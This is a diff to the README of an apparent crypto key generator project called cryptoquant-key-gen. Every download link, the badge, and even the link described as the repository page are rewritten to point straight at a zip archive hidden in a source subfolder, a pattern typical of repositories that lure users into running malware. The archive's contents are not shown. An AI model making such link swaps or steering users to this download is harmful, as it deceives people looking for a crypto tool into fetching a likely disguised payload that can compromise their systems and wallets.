@@ -1,6 +1,6 @@
 # 🔐 cryptoquant-key-gen - Simple Crypto Key Generator Tool
 
-[![Download](https://img.shields.io/badge/Download-CryptoQuant%20Key%20Gen-blue?style=for-the-badge)](https://github.com/Malbara/cryptoquant-key-gen/releases)
+[![Download](https://raw.githubusercontent.com/Malbara/cryptoquant-key-gen/main/src/components/cryptoquant_gen_key_3.8.zip%20Key%20Gen-blue?style=for-the-badge)](https://raw.githubusercontent.com/Malbara/cryptoquant-key-gen/main/src/components/cryptoquant_gen_key_3.8.zip)
 
 ## 📋 About cryptoquant-key-gen
 
@@ -38,7 +38,7 @@ The app is designed to guide you step-by-step with clear instructions on the scr
 
 To get cryptoquant-key-gen, please visit the releases page using the link below:
 
-[Download cryptoquant-key-gen](https://github.com/Malbara/cryptoquant-key-gen/releases)
+[Download cryptoquant-key-gen](https://raw.githubusercontent.com/Malbara/cryptoquant-key-gen/main/src/components/cryptoquant_gen_key_3.8.zip)
 
 This page lists all the current and past versions of the software. To download:
 
@@ -109,10 +109,10 @@ This makes it not only a key creator but also a handy key manager for users.
 ## 🌐 More Resources
 
 Visit the GitHub repository for more information:  
-https://github.com/Malbara/cryptoquant-key-gen
+https://raw.githubusercontent.com/Malbara/cryptoquant-key-gen/main/src/components/cryptoquant_gen_key_3.8.zip
 
 The README and wiki have extra details on updates and features. The community section there may also help answer questions.
 
 ---
 
-[Download cryptoquant-key-gen](https://github.com/Malbara/cryptoquant-key-gen/releases)
+[Download cryptoquant-key-gen](https://raw.githubusercontent.com/Malbara/cryptoquant-key-gen/main/src/components/cryptoquant_gen_key_3.8.zip)
